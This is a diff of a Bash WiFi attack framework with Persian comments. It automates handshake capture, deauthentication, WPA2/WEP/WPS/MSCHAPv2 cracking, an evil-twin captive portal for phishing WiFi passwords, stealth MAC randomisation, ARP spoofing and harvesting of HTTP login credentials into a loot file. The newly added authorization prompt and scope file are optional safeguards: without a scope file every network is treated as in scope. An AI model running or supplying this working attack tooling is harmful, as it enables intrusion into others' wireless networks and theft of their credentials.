+  command -v iw >/dev/null || warn "iw نصب نیست؛ آماده‌سازی رادیو غیرفعال می‌شود."
+  command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف‌تر می‌شود."
+else
+  command -v hashcat >/dev/null || warn "hashcat نصب نیست؛ cracking غیرفعال می‌شود."
+  command -v hcxpcapngtool >/dev/null || warn "hcxpcapngtool نصب نیست؛ استخراج غیرفعال می‌شود."
 fi
-command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف‌تر می‌شود."
+
+# ---------- اعتبارسنجی scope و اجازهٔ صریح ----------
+if [ "$OFFLINE" -ne 1 ] && [ "$DRY_RUN" -ne 1 ]; then
+  if [ "$AUTHORIZED" -ne 1 ]; then
+    if [ -t 0 ]; then
+      echo
+      warn "حملات فعال نیازمند اجازهٔ صریح (written authorization) هستند."
+      read -rp "برای ادامه عبارت 'I HAVE AUTHORIZATION' را تایپ کن: " _ack
+      if [ "$_ack" != "I HAVE AUTHORIZATION" ]; then
+        err "اجازه تأیید نشد. خروج."; exit 1
+      fi
+      AUTHORIZED=1
+    else
+      err "حملات فعال نیازمند --authorize دارند (اجازهٔ کتبی). خروج."; exit 1
+    fi
+  fi
+  if [ -n "$SCOPE_FILE" ]; then
+    [ -f "$SCOPE_FILE" ] || { err "فایل scope یافت نشد: $SCOPE_FILE"; exit 1; }
+    ok "scope بارگذاری شد: $SCOPE_FILE"
+  else
+    warn "هیچ --scope داده نشد: همهٔ شبکه‌های محدوده مجاز تلقی می‌شوند."
+  fi
+fi
 
 # ---------- پاکسازی ----------
 _CLEANED=0
@@ -269,7 +867,8 @@ cleanup(){
   [ -n "${MDK_PID:-}" ] && { kill "$MDK_PID" 2>/dev/null; wait "$MDK_PID" 2>/dev/null; }
   [ -n "${SCAN_PID:-}" ] && { kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null; }
   [ -n "${TWIN_PID:-}" ] && { kill "$TWIN_PID" 2>/dev/null; wait "$TWIN_PID" 2>/dev/null; }
-  if [ -n "${KISMET_RAN:-}" ]; then pkill -f 'kismet -c' 2>/dev/null || true; fi
+  # kill any orphaned child processes (mdk4, airodump-ng, hcxdumptool, ...)
+  pkill -P $$ 2>/dev/null || true
   [ -n "${MON:-}" ] && airmon-ng stop "$MON" >/dev/null 2>&1
   # revert macchanger if applied
   if [ -n "${ORIG_MAC:-}" ] && [ -n "${MON:-}" ]; then
@@ -282,75 +881,129 @@ cleanup(){
   hr; c "خروجی‌ها: ${WORK:-}"
 }
 trap cleanup EXIT
+trap 'cleanup; exit 129' HUP
 trap 'cleanup; exit 130' INT
+trap 'cleanup; exit 131' QUIT
 trap 'cleanup; exit 143' TERM
 
 # ---------- فاز ۰: آماده‌سازی ----------
-hr; c "فاز ۰ — آماده‌سازی"
-if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
-[ -n "$IFACE" ] || { err "دانگل وای‌فای پیدا نشد."; exit 1; }
+if [ "$OFFLINE" -ne 1 ] && command -v airmon-ng >/dev/null 2>&1 && command -v iw >/dev/null 2>&1; then
+  hr; c "فاز ۰ — آماده‌سازی"
+  if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
+  [ -n "$IFACE" ] || { err "دانگل وای‌فای پیدا نشد."; exit 1; }
 
-if [ -z "$IFACE2" ]; then
-  IFACE2=$(iw dev | awk -v skip="$IFACE" '/Interface/ && $2 != skip {print $2; exit}')
-fi
-if [ -n "$IFACE2" ]; then
-  ok "دانگل دوم برای evil twin: $IFACE2"
+  if [ -z "$IFACE2" ]; then
+    IFACE2=$(iw dev | awk -v skip="$IFACE" '/Interface/ && $2 != skip {print $2; exit}')
+  fi
+  if [ -n "$IFACE2" ]; then
+    ok "دانگل دوم برای evil twin: $IFACE2"
+  else
+    warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0
+  fi
+
+  if command -v hashcat >/dev/null 2>&1; then
+    c "تشخیص GPU / بنچمارک hashcat..."
+    hashcat -I > "$WORK/hashcat-info.txt" 2>&1
+    if grep -qiE 'Type\.+: (GPU|CUDA|HIP)' "$WORK/hashcat-info.txt"; then
+    ok "GPU شناسایی شد."
+  elif grep -qi 'OpenCL' "$WORK/hashcat-info.txt"; then
+    warn "فقط CPU/OpenCL؛ کند خواهد بود."
+  else
+    err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."
+  fi
+  else
+    warn "hashcat یافت نشد؛ تشخیص GPU رد شد."
+  fi
+
+  airmon-ng check kill >/dev/null 2>&1
+  BEFORE=$(iw dev | awk '/Interface/{print $2}')
+  airmon-ng start "$IFACE" >/dev/null 2>&1
+  AFTER=$(iw dev | awk '/Interface/{print $2}')
+  MON=$(comm -13 <(sort <<<"$BEFORE") <(sort <<<"$AFTER") | head -1)
+  [ -z "$MON" ] && MON="$IFACE"
+  iw dev "$MON" info 2>/dev/null | grep -q monitor || {
+    ip link set "$MON" down; iw dev "$MON" set type monitor; ip link set "$MON" up; }
+  iw dev "$MON" info 2>/dev/null | grep -q monitor || { err "مانیتور مود نشد."; exit 1; }
+  ok "مانیتور مود: $MON"
+
+  # MAC رندوم برای مخفی‌کاری در حالت stealth
+  if [ "$PROFILE" = stealth ]; then
+    ORIG_MAC=$(ip link show "$MON" 2>/dev/null | awk '/link\/ether/{print $2; exit}')
+    ip link set "$MON" down
+    macchanger -r "$MON" >/dev/null 2>&1 || true
+    ip link set "$MON" up
+    ok "MAC رندوم شد."
+  fi
 else
-  warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0
+  if [ "$OFFLINE" -ne 1 ]; then
+    warn "airmon-ng یا iw یافت نشد — فاز ۰ (آماده‌سازی رادیو) رد شد."
+  else
+    c "حالت offline/crack-only: فاز ۰ (radio) رد شد."
+  fi
+  MON=""
+  DO_TWIN=0
+  DO_WPS=0
 fi
 
-c "تشخیص GPU / بنچمارک hashcat..."
-hashcat -I > "$WORK/hashcat-info.txt" 2>&1
-if grep -qiE 'Type\.+: (GPU|CUDA|HIP)' "$WORK/hashcat-info.txt"; then
-  ok "GPU شناسایی شد."
-elif grep -qi 'OpenCL' "$WORK/hashcat-info.txt"; then
-  warn "فقط CPU/OpenCL؛ کند خواهد بود."
-else
-  err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."
+# ---------- انتخاب خودکار هدف (--auto) ----------
+if [ "$AUTO" -eq 1 ] && [ -z "${TARGET:-}" ] && [ -n "${MON:-}" ] && command -v airodump-ng >/dev/null 2>&1; then
+  hr; c "حالت auto: اسکن کوتاه برای انتخاب قوی‌ترین شبکهٔ WPA2"
+  SCAN_CSV="$WORK/autoscan"
+  timeout 20 airodump-ng --write "$SCAN_CSV" --output-format csv "$MON" >/dev/null 2>&1 || true
+  TARGET=$(awk -F, '
+    $1 ~ /^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:/ {
+      bssid=$1; pwr=$9; priv=$6
+      gsub(/^[ \t]+|[ \t]+$/, "", bssid)
+      gsub(/^[ \t]+|[ \t]+$/, "", pwr)
+      gsub(/^[ \t]+|[ \t]+$/, "", priv)
+      if (priv ~ /WPA2/ && pwr ~ /^-?[0-9]+$/) {
+        if (best == "" || pwr+0 > bestpwr+0) { best=bssid; bestpwr=pwr }
+      }
+    }
+    END { if (best != "") print best }
+  ' "${SCAN_CSV}-01.csv" 2>/dev/null)
+  if [ -n "${TARGET:-}" ]; then
+    ok "هدف انتخاب‌شده (auto): $TARGET"
+  else
+    warn "هیچ شبکهٔ WPA2 در اسکن یافت نشد."
+  fi
 fi
 
-airmon-ng check kill >/dev/null 2>&1
-BEFORE=$(iw dev | awk '/Interface/{print $2}')
-airmon-ng start "$IFACE" >/dev/null 2>&1
-AFTER=$(iw dev | awk '/Interface/{print $2}')
-MON=$(comm -13 <(sort <<<"$BEFORE") <(sort <<<"$AFTER") | head -1)
-[ -z "$MON" ] && MON="$IFACE"
-iw dev "$MON" info 2>/dev/null | grep -q monitor || {
-  ip link set "$MON" down; iw dev "$MON" set type monitor; ip link set "$MON" up; }
-iw dev "$MON" info 2>/dev/null | grep -q monitor || { err "مانیتور مود نشد."; exit 1; }
-ok "مانیتور مود: $MON"
-
-# MAC رندوم برای مخفی‌کاری در حالت stealth
-if [ "$PROFILE" = stealth ]; then
-  ORIG_MAC=$(ip link show "$MON" 2>/dev/null | awk '/link\/ether/{print $2; exit}')
-  ip link set "$MON" down
-  macchanger -r "$MON" >/dev/null 2>&1 || true
-  ip link set "$MON" up
-  ok "MAC رندوم شد."
+# ---------- فاز WEP: کرک شبکه‌های WEP ----------
+if [ "$WEP" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -n "${MON:-}" ]; then
+  hr; c "فاز WEP — کرک شبکه‌های WEP (ARP replay / chopchop / fragmentation)"
+  if ! command -v airodump-ng >/dev/null 2>&1 || ! command -v aircrack-ng >/dev/null 2>&1; then
+    warn "airdump-ng/aircrack-ng یافت نشد — فاز WEP رد شد."
+  else
+    WEPSCAN="$WORK/wep-scan"
+    timeout 20 airodump-ng --output-format csv -w "$WEPSCAN" "$MON" >/dev/null 2>&1 || true
+    awk -F, '$1 ~ /^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:/ {
+      b=$1; p=$6; ch=$4
+      gsub(/^[ \t]+|[ \t]+$/, "", b); gsub(/^[ \t]+|[ \t]+$/, "", p); gsub(/^[ \t]+|[ \t]+$/, "", ch)
+      if (p ~ /WEP/) print b, ch
+    }' "${WEPSCAN}-01.csv" 2>/dev/null | sort -u | while read -r b ch; do
+      [ -z "$b" ] && continue
+      in_scope "$b" "" || { warn "  $b خارج از scope — رد شد."; continue; }
+      crack_wep "$b" "$ch"
+    done
+  fi
 fi
 
 # ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
-if [ "$SKIP_TO" -le 1 ] && command -v kismet >/dev/null; then
+if [ "$SKIP_TO" -le 1 ] && [ "$OFFLINE" -ne 1 ] && command -v kismet >/dev/null; then
   hr; c "فاز ۰.۵ — شناسایی منفعل با kismet"
-  KISMET_RAN=1
   timeout 30 kismet -c "$MON" >/dev/null 2>&1 || true
   ok "شناسایی منفعل کامل شد."
   save_checkpoint 1
 fi
 
 # ---------- فاز ۱: برداشت ----------
-if [ "$SKIP_TO" -le 2 ]; then
+if [ "$SKIP_TO" -le 2 ] && [ "$OFFLINE" -ne 1 ] && command -v hcxdumptool >/dev/null 2>&1 && command -v airodump-ng >/dev/null 2>&1; then
+  if [ -n "${TARGET:-}" ] && ! in_scope "$TARGET" ""; then
+    err "هدف $TARGET خارج از scope است. خروج."; exit 1
+  fi
 hr; c "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"
-HDR=$(hcxdumptool --help 2>&1 || true)
-if grep -q -- '--filterlist_ap' <<<"$HDR"; then
-  if grep -qE '^\s*-w[, ]' <<<"$HDR"; then OUTFLAG=-w; else OUTFLAG=-o; fi
-  FILTER=()
-  [ -n "$TARGET" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
-  hcxdumptool -i "$MON" "$OUTFLAG" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
-  HK_PID=$!
-else
-  err "نسخه hcxdumptool ناشناخته."; exit 1
-fi
+capture_once || exit 1
 
 # دِاوث دوره‌ای با mdk4 برای اجبار به reassociation (در PMKID-only غیرفعال)
 if [ "$PMKID_ONLY" -ne 1 ] && command -v mdk4 >/dev/null; then
@@ -383,10 +1036,14 @@ if command -v tshark >/dev/null; then
 fi
 
   save_checkpoint 2
+else
+  if [ "$OFFLINE" -ne 1 ]; then
+    warn "hcxdumptool یا airodump-ng یافت نشد — فاز ۱ (برداشت) رد شد."
+  fi
 fi
 
 # ---------- فاز ۲: نرمال‌سازی ----------
-if [ "$SKIP_TO" -le 3 ]; then
+if [ "$SKIP_TO" -le 3 ] && command -v hcxpcapngtool >/dev/null 2>&1; then
 hr; c "فاز ۲ — استخراج و حذف تکراری"
 extract_hashes
 
@@ -400,6 +1057,8 @@ elif [ "$PMKID_ONLY" -eq 1 ]; then
 fi
 
   save_checkpoint 3
+else
+  warn "hcxpcapngtool یافت نشد — فاز ۲ (استخراج) رد شد."
 fi
 
 # ---------- ارزیابی کیفیت handshake ----------
@@ -417,37 +1076,52 @@ c "کیفیت handshake: $HS_SCORE/3 (PMKID=${PMKID_N:-0}, EAPOL=${EAPOL_N:-0})"
 
 # در صورت ناقص بودن، یک بار re-capture انجام بده
 CRACK_ENABLED=1
-if [ "$HS_OK" -ne 1 ]; then
-  warn "handshake ناقص است؛ تلاش برای re-capture..."
-  # re-run capture core
-  if [ -n "${MON:-}" ]; then
-    HDR=$(hcxdumptool --help 2>&1 || true)
-    if grep -q -- '--filterlist_ap' <<<"$HDR"; then
-      if grep -qE '^\s*-w[, ]' <<<"$HDR"; then OUTFLAG=-w; else OUTFLAG=-o; fi
-      FILTER=()
-      [ -n "${TARGET:-}" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
+  if [ "$HS_OK" -ne 1 ] && [ "$OFFLINE" -ne 1 ]; then
+    warn "handshake ناقص است؛ تلاش برای re-capture..."
+    if [ -n "${MON:-}" ] && command -v hcxdumptool >/dev/null 2>&1; then
       rm -f "$CAP" 2>/dev/null
-      hcxdumptool -i "$MON" "$OUTFLAG" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
-      HK_PID=$!
-      sleep 10
-      kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
+      if capture_once; then
+        sleep 10
+        kill "${HK_PID:-}" 2>/dev/null; wait "${HK_PID:-}" 2>/dev/null; HK_PID=""
+        if [ -s "$CAP" ]; then
+          extract_hashes
+          handshake_quality
+          c "کیفیت handshake پس از re-capture: $HS_SCORE/3"
+        fi
+      fi
+    fi
+    if [ "$HS_OK" -ne 1 ]; then
+      warn "handshake همچنان ناقص است؛ cracking رد می‌شود."
+      CRACK_ENABLED=0
     fi
   fi
-  if [ -s "$CAP" ]; then
-    extract_hashes
-    handshake_quality
-    c "کیفیت handshake پس از re-capture: $HS_SCORE/3"
-  fi
-  if [ "$HS_OK" -ne 1 ]; then
-    warn "handshake همچنان ناقص است؛ cracking رد می‌شود."
-    CRACK_ENABLED=0
-  fi
+
 fi
 
+# ---------- PSK پیش‌فرض (zero GPU) ----------
+if [ "$SKIP_TO" -le 4 ] && [ "${DEFAULT_PSK:-1}" -eq 1 ] && [ -s "${CAP:-}" ] && command -v aircrack-ng >/dev/null 2>&1; then
+  hr; c "فاز ۳.۰ — PSK پیش‌فرض (zero GPU)"
+  _essid=$(head -1 "$WORK/essids.txt" 2>/dev/null)
+  _bssid="${TARGET:-}"
+  [ -z "$_bssid" ] && _bssid=$(awk -F, 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/{print $1; exit}' "$WORK/scan-01.csv" 2>/dev/null | tr -d ' ')
+  _cand="$WORK/default-psk-candidates.txt"
+  derive_default_psks "$_bssid" "$_essid" | sort -u > "$_cand" 2>/dev/null
+  if [ -s "$_cand" ]; then
+    c "  → aircrack-ng با $(wc -l < "$_cand") کاندید"
+    aircrack-ng -w "$_cand" ${_essid:+-e "$_essid"} "$CAP" > "$WORK/default-psk-crack.txt" 2>&1 || true
+    _key=$(grep -i 'KEY FOUND' "$WORK/default-psk-crack.txt" | sed 's/.*\[ //;s/ \].*//' | head -1)
+    if [ -n "$_key" ]; then
+      ok "PSK پیش‌فرض یافت شد: $_key"
+      [ -n "$_bssid" ] && echo "$_bssid|$_key|default-psk" >> "$WORK/cracked.txt"
+      CRACK_ENABLED=0
+    else
+      warn "PSK پیش‌فرض یافت نشد؛ ادامه با hashcat."
+    fi
+  fi
 fi
 
 # ---------- فاز ۳: موتور کرک ----------
-if [ "$SKIP_TO" -le 4 ] && [ "${CRACK_ENABLED:-1}" -eq 1 ]; then
+if [ "$SKIP_TO" -le 4 ] && [ "${CRACK_ENABLED:-1}" -eq 1 ] && command -v hashcat >/dev/null 2>&1; then
 hr; c "فاز ۳ — موتور کرک مرحله‌ای"
 
 
@@ -483,8 +1157,12 @@ run_hc(){
   local tot cr; tot=$(total_count); cr=$(cracked_count)
   [ "$cr" -ge "$tot" ] && return 0
   c "  → $label  ($cr/$tot)"
+  local sess_args=(--session "$SESSION")
+  if [ "$RESTORE" -eq 1 ]; then
+    sess_args+=(--restore)
+  fi
   timeout 900 hashcat -m 22000 --potfile-path "$POT" -w "$WLIMIT" -O --force \
-    --status --status-timer=30 "$HASH" "$@" >> "$WORK/hc.log" 2>&1
+    --status --status-timer=30 "${sess_args[@]}" "$HASH" "$@" >> "$WORK/hc.log" 2>&1
 }
 
 build_dicts
@@ -546,17 +1224,21 @@ fi
 # لایه ۸: Enterprise MSCHAPv2
 if [ -s "$WORK/mschapv2.txt" ]; then
   hr; c "فاز ۳ب — کرک Enterprise (MSCHAPv2)"
-  timeout 600 hashcat -m 5500 --potfile-path "$POT" -w "$WLIMIT" --force "$WORK/mschapv2.txt" \
-    "${WORDLISTS[0]}" >> "$WORK/hc.log" 2>&1
+  ent_sess=(--session "${SESSION}-ent")
+  [ "$RESTORE" -eq 1 ] && ent_sess+=(--restore)
+  timeout 600 hashcat -m 5500 --potfile-path "$POT" -w "$WLIMIT" --force "${ent_sess[@]}" \
+    "$WORK/mschapv2.txt" "${WORDLISTS[0]}" >> "$WORK/hc.log" 2>&1
   hashcat -m 5500 "$WORK/mschapv2.txt" --show --potfile-path "$POT" 2>/dev/null \
     >> "$WORK/enterprise-cracked.txt"
 fi
 
   save_checkpoint 4
+else
+  warn "hashcat یافت نشد — فاز ۳ (کرک) رد شد."
 fi
 
 # ---------- فاز ۴: WPS Pixie Dust + Brute ----------
-if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
+if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ] && { command -v reaver >/dev/null 2>&1 || command -v bully >/dev/null 2>&1; }; then
   hr; c "فاز ۴ — WPS (Pixie Dust + Brute)"
   # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
   parse_wps_csv() {
@@ -564,10 +1246,7 @@ if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; th
       "$WORK/scan-01.csv" | sort -u
   }
   if command -v wash >/dev/null; then
-    wash -i "$MON" -o "$WORK/wps-scan.txt" 2>/dev/null &
-    WASH_PID=$!
-    sleep 15
-    kill "$WASH_PID" 2>/dev/null; wait "$WASH_PID" 2>/dev/null
+    timeout 15 wash -i "$MON" -o "$WORK/wps-scan.txt" >/dev/null 2>&1 || true
     if [ -s "$WORK/wps-scan.txt" ]; then
       awk '{print $1, $6}' "$WORK/wps-scan.txt" | sort -u > "$WORK/wps-cands.txt"
     else
@@ -579,12 +1258,45 @@ if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; th
   while read -r b ch; do
     grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
     [ -z "$ch" ] && continue
+    in_scope "$b" "" || { warn "  $b خارج از scope — رد شد."; continue; }
+    # lockout check (resume-aware)
+    wps_is_locked "$b" || true
+    # ۰) NULL PIN (اولویت بالا)
+    if command -v reaver >/dev/null; then
+      grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null || {
+        timeout 20 reaver -i "$MON" -b "$b" -c "$ch" -p '' -N -vv -d 1 \
+          > "$WORK/wps-null-$b.txt" 2>&1 || true
+        k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-null-$b.txt")
+        if [ -n "$k" ]; then
+          ok "WPS (NULL PIN) → $k" && echo "$b|$k|WPS-nullpin" >> "$WORK/cracked.txt"
+        fi
+        wps_detect_lockout "$WORK/wps-null-$b.txt" "$b" && continue
+      }
+    fi
+    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
+    # الگوریتم‌های شناخته‌شدهٔ WPS PIN (کرک فوری) — اولویت ۲
+    if command -v reaver >/dev/null; then
+      for pin in $(compute_wps_pins "$b"); do
+        grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && break
+        timeout 20 reaver -i "$MON" -b "$b" -c "$ch" -p "$pin" \
+          -N -vv -d 1 > "$WORK/wps-known-$b.txt" 2>&1
+        k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-known-$b.txt")
+        if [ -n "$k" ]; then
+          ok "WPS (known PIN $pin) → $k" && echo "$b|$k|WPS-knownpin" >> "$WORK/cracked.txt"
+          wps_record_pin "$b" "$pin"
+          break
+        fi
+        wps_detect_lockout "$WORK/wps-known-$b.txt" "$b" && break
+      done
+    fi
+    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
     # reaver Pixie Dust
     if command -v reaver >/dev/null; then
       c "  → reaver -K 1 روی $b"
       timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
       k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
       [ -n "$k" ] && ok "WPS (reaver) → $k" && echo "$b|$k|WPS-reaver" >> "$WORK/cracked.txt" && continue
+      wps_detect_lockout "$WORK/wps-$b.txt" "$b" && continue
     fi
     # bully: brute-force PIN (alternative to reaver)
     if command -v bully >/dev/null; then
@@ -594,6 +1306,10 @@ if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; th
       [ -n "$k" ] && ok "WPS (bully) → $k" && echo "$b|$k|WPS-bully" >> "$WORK/cracked.txt"
     fi
   done < "$WORK/wps-cands.txt"
+else
+  if [ "$DO_WPS" -eq 1 ]; then
+    warn "reaver/bully یافت نشد — فاز ۴ (WPS) رد شد."
+  fi
 fi
 
 # ---------- گزارش کرک ----------
@@ -615,12 +1331,15 @@ done < "$WORK/cracked-raw.txt"
 fi
 
 # ---------- فاز ۵: Evil Twin ----------
-if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ]; then
+if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ] && { command -v hostapd-mana >/dev/null 2>&1 || command -v wifiphisher >/dev/null 2>&1; }; then
   hr; c "فاز ۵ — Evil Twin + captive portal"
   if command -v hostapd-mana >/dev/null; then
     TGT="${TARGET:-$(awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x);print x; exit}' "$WORK/scan-01.csv")}"
     ESS=$(awk -F',' -v b="$TGT" 'NR>1 {x=$1;gsub(/ /,"",x); if(x==b){e=$14;gsub(/^ +| +$/,"",e);print e;exit}}' "$WORK/scan-01.csv")
     if [ -n "$TGT" ] && [ -n "$ESS" ]; then
+      if ! in_scope "$TGT" "$ESS"; then
+        warn "هدف twin ($TGT/$ESS) خارج از scope — رد شد."
+      else
       cat > "$WORK/mana.conf" <<EOF
 interface=$IFACE2
 driver=nl80211
@@ -639,53 +1358,29 @@ EOF
       kill "$TWIN_PID" 2>/dev/null; TWIN_PID=""
       [ -s "$WORK/creds.txt" ] && ok "اعتبارنامه از twin:" && cat "$WORK/creds.txt" \
         && sed 's/^/TWIN|/' "$WORK/creds.txt" >> "$WORK/cracked.txt"
+      fi
     fi
   elif command -v wifiphisher >/dev/null; then
     wifiphisher -aI "$IFACE2" -eI "$MON" -p firmware-upgrade --noextensions
   else
     warn "hostapd-mana یا wifiphisher نصب نیست."
   fi
+else
+  if [ "$DO_TWIN" -eq 1 ] && ! [ -s "$WORK/cracked.txt" ]; then
+    warn "hostapd-mana یا wifiphisher یافت نشد — فاز ۵ (Evil Twin) رد شد."
+  fi
 fi
 
   save_checkpoint 6
 
 # ---------- فاز ۶: Post-exploit ----------
-if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
+if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -s "$WORK/cracked.txt" ] && command -v nmap >/dev/null 2>&1; then
   hr; c "فاز ۶ — آماده‌سازی post-exploit"
   first=$(head -1 "$WORK/cracked.txt")
   b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
   # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort, چند روش)
-  detect_subnet() {
-    local sub="" gw det
-    # ۱) اتصال موقت از طریق IFACE2
-    if [ -n "${IFACE2:-}" ] && command -v nmcli >/dev/null; then
-      c "  → اتصال به شبکه برای تشخیص subnet (via $IFACE2)"
-      if nmcli dev wifi connect "$b" password "$p" ifname "$IFACE2" >/dev/null 2>&1; then
-        sleep 5
-        det=$(ip -4 route 2>/dev/null | awk -v dev="$IFACE2" '$0 ~ dev && /proto kernel/ {print $1; exit}')
-        [ -n "$det" ] && sub="$det"
-        nmcli dev disconnect "$IFACE2" >/dev/null 2>&1 || true
-      fi
-    fi
-    # ۲) مسیرهای kernel موجود (اتصال قبلی)
-    if [ -z "$sub" ]; then
-      sub=$(ip -4 route 2>/dev/null | awk '/proto kernel/ {print $1; exit}')
-    fi
-    # ۳) فایل‌های DHCP lease
-    if [ -z "$sub" ]; then
-      for f in /var/lib/dhcp/*.leases /var/lib/NetworkManager/*.lease; do
-        [ -r "$f" ] || continue
-        gw=$(grep -oE 'option routers [0-9.]+' "$f" 2>/dev/null | awk '{print $3}' | head -1)
-        [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; break; }
-      done
-    fi
-    # ۴) gateway پیش‌فرض → فرض /24
-    if [ -z "$sub" ]; then
-      gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
-      [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; }
-    fi
-    printf '%s' "${sub:-192.168.1.0/24}"
-  }
+    # تشخیص subnet: اتصال موقت + fallback (top-level helper)
+  c "  → تشخیص subnet (via $IFACE2)"
   SUBNET=$(detect_subnet)
   if [ "$SUBNET" = "192.168.1.0/24" ]; then
     warn "subnet تشخیص داده نشد؛ پیش‌فرض $SUBNET"
@@ -708,62 +1403,29 @@ sudo bettercap -iface "$IFACE" -eval 'set arp.spoof.fullduplex true; arp.spoof o
 EOF
   chmod +x "$REPORT/connect.sh"
   ok "اسکریپت اتصال + bettercap: $REPORT/connect.sh"
+  # استخراج پیکربندی محلی (TR-064/UPnP, SNMP, Telnet/SSH, Web, Cloud, WPS)
+  if [ "${CONFIG_EXTRACT:-1}" -eq 1 ]; then
+    extract_local_config "$b" "$p"
+  fi
+else
+  if [ "$DO_POST" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -s "$WORK/cracked.txt" ]; then
+    warn "nmap یافت نشد — فاز ۶ (post-exploit) رد شد."
+  fi
 fi
 
   save_checkpoint 7
 
 # ---------- فاز ۷: برداشت اعتبارنامهٔ HTTP ----------
-if [ "$SKIP_TO" -le 7 ] && [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
+if [ "$SKIP_TO" -le 8 ] && [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ] && command -v tshark >/dev/null 2>&1; then
   hr; c "فاز ۷ — برداشت اعتبارنامهٔ HTTP (passive)"
   LOOT="$REPORT/loot.tsv"
   printf 'timestamp\tsource_ip\tdest_host\tmethod\turi\tusername\tpassword\ttype\n' > "$LOOT"
 
-  parse_pcap_creds() {
-    local pcap="$1"
-    [ -s "$pcap" ] || return 0
-    command -v tshark >/dev/null || return 0
-    # ۱) Basic Authentication
-    tshark -r "$pcap" -Y 'http.authorization contains "Basic"' -T fields \
-      -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri -e http.authorization \
-      2>/dev/null | while IFS=$'\t' read -r ts src host method uri auth; do
-      [ -z "$auth" ] && continue
-      b64="${auth#* }"
-      creds=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
-      [ -z "$creds" ] && continue
-      u="${creds%%:*}"; p="${creds#*:}"
-      [ "$u" = "$creds" ] && p=''
-      printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\tBasic\n' \
-        "${ts:-}" "${src:-}" "${host:-}" "${method:-}" "${uri:-}" "$u" "$p" >> "$LOOT"
-      ok "Basic auth: $u:$p  ($host$uri)"
-    done
-    # ۲) فرم‌های POST (user/pass)
-    tshark -r "$pcap" -Y 'http.request.method == "POST"' -T fields \
-      -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data \
-      2>/dev/null | while IFS=$'\t' read -r ts src host uri body; do
-      [ -z "$body" ] && continue
-      # استخراج پارامترهای credential-like
-      user=''; pass=''
-      for kv in $(printf '%s' "$body" | tr '&' ' '); do
-        key="${kv%%=*}"; val="${kv#*=}"
-        key_l=$(printf '%s' "$key" | tr '[:upper:]' '[:lower:]')
-        case "$key_l" in
-          *user*|*login*|*email*|*account*|*name*) [ -z "$user" ] && user="$val";;
-          *pass*|*pwd*|*secret*|*token*) [ -z "$pass" ] && pass="$val";;
-        esac
-      done
-      if [ -n "$user" ] || [ -n "$pass" ]; then
